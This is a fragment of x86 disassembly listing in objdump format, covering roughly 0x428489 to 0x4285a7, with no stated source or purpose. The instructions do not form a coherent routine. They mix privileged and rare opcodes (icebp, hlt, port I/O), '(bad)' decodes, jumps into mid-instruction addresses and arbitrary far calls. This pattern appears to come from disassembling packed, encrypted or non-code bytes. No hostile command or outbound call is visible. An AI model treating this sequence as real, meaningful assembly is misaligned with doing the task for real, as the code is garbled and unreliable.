  428489:	imul   esp,DWORD PTR [ebx+0x2d1a6684],0x3a2069cd
  428493:	jne    0x42845f
  428495:	cmp    eax,0x6b0b7710
  42849a:	mov    ah,0x49
  42849c:	jmp    0x42842d
  42849e:	mov    esi,edx
  4284a0:	icebp  
  4284a1:	push   0x6cacb249
  4284a6:	scas   eax,DWORD PTR es:[edi]
  4284a7:	icebp  
  4284a8:	cdq    
  4284a9:	ficom  DWORD PTR [ebx+0x7790053f]
  4284b0:	sbb    eax,DWORD PTR [edi]
  4284b2:	mov    BYTE PTR ds:0xf3e9662c,al
  4284b8:	fst    st(2)
  4284ba:	sub    eax,0xcc27fb4b
  4284bf:	push   ds
  4284c0:	jnp    0x428457
  4284c2:	lds    ebx,FWORD PTR [esi+0x31d08fdc]
  4284c8:	ja     0x428458
  4284ca:	stc    
  4284cb:	or     DWORD PTR [edi],esp
  4284cd:	sub    eax,0x4eff8ca2
  4284d2:	fiadd  WORD PTR [ebx-0x4b]
  4284d5:	das    
  4284d6:	mov    dh,0x3f
  4284d8:	mov    fs,WORD PTR [eax]
  4284da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284db:	sbb    al,0x4d
  4284dd:	mov    dl,0xaa
  4284df:	call   0xbd47e8e1
  4284e4:	jo     0x428555
  4284e6:	imul   esp,DWORD PTR ds:0xd9b735d2,0x18d154d3
  4284f0:	push   ss
  4284f1:	mov    dl,0xfa
  4284f3:	mov    edi,0x50ca8931
  4284f8:	mov    bh,0x3
  4284fa:	xchg   ebp,eax
  4284fb:	mov    ecx,0x1f8007a2
  428500:	mov    edx,0x27f297ba
  428505:	mov    ch,0x56
  428507:	popa   
  428508:	(bad)  
  428509:	mov    ah,0x89
  42850b:	xchg   DWORD PTR [edi-0x856e1b4],esi
  428511:	pop    edx
  428512:	xor    dh,BYTE PTR [esi-0x46]
  428515:	inc    esp
  428516:	out    dx,al
  428517:	popf   
  428518:	ret    0x43fc
  42851b:	hlt    
  42851c:	jl     0x4284cb
  42851e:	aas    
  42851f:	js     0x428526
  428521:	adc    BYTE PTR fs:[ecx-0x29b5d24e],dh
  428528:	xor    bh,ch
  42852a:	outs   dx,DWORD PTR ds:[esi]
  42852b:	inc    edi
  42852c:	shr    BYTE PTR [esi+esi*4],1
  42852f:	pop    DWORD PTR [eax*8-0x70d53baa]
  428536:	sbb    ecx,DWORD PTR [ebp-0x45]
  428539:	scas   al,BYTE PTR es:[edi]
  42853a:	imul   eax,DWORD PTR [ebp+0x44],0xffffff9d
  42853e:	pusha  
  42853f:	mov    esp,0xc9c8ad7d
  428544:	sbb    dl,ch
  428546:	sub    BYTE PTR [ebp+eiz*4-0x31336c62],0x62
  42854e:	adc    ah,BYTE PTR [esp+eax*1-0xecd17dd]
  428555:	loop   0x42851a
  428557:	sub    eax,0x99b77a08
  42855c:	outs   dx,DWORD PTR ds:[esi]
  42855d:	adc    al,0x1a
  42855f:	add    bh,BYTE PTR [esi]
  428561:	push   ds
  428562:	dec    esi
  428563:	ret    
  428564:	idiv   esp
  428566:	fcom   DWORD PTR [edx]
  428568:	jae    0x428577
  42856a:	hlt    
  42856b:	cli    
  42856c:	neg    DWORD PTR [ebx]
  42856e:	ins    BYTE PTR es:[edi],dx
  42856f:	sbb    eax,DWORD PTR [eax]
	...
  428579:	add    BYTE PTR [ecx-0x7d39faf],ch
  42857f:	cmp    eax,0x65b9d5ed
  428584:	test   BYTE PTR [ecx+0x2b2b3655],ch
  42858a:	nop
  42858b:	cli    
  42858c:	add    DWORD PTR [eax],eax
  42858e:	adc    BYTE PTR [eax],al
  428590:	add    BYTE PTR [eax],al
  428592:	sbb    DWORD PTR [ebp-0x5d68af4e],ebx
  428598:	dec    eax
  428599:	and    DWORD PTR [ebx],edi
  42859b:	stos   DWORD PTR es:[edi],eax
  42859c:	cli    
  42859d:	mov    ah,0x30
  42859f:	lods   eax,DWORD PTR ds:[esi]
  4285a0:	and    BYTE PTR fs:[eax],al
  4285a3:	add    BYTE PTR [eax],al
  4285a5:	add    BYTE PTR [eax],al
  4285a7:	add    BYTE PTR [eax],al
	...
